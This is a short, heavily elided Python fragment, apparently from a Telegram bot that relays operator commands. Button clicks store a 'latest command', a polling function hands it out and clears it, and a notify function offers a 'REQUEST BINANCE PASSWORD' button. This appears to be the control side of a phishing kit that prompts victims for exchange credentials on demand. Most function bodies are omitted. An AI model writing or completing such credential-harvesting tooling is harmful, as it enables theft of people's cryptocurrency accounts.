...
def handle_button_click(update: Update, context):
    ...
    if command in COMMANDS:
        latest_command = command  # Store the latest command
        print(f"COMMAND RECEIVED: {latest_command} - {COMMANDS[command]}")
        try:
...
def check_command():
    ...
    if latest_command:
        ...
        latest_command = None  # Clear the command after fetching
...
def send_message():
    ...
    print(f"message is {message} nd data is {data}")
...
def notify():
    ...
    try:
        ...
        payload = {
            ...
            "reply_markup": {
                "inline_keyboard": [
                    [{"text": "REQUEST BINANCE PASSWORD", "callback_data": "REQUEST_BINANCE_PASSWORD"}],
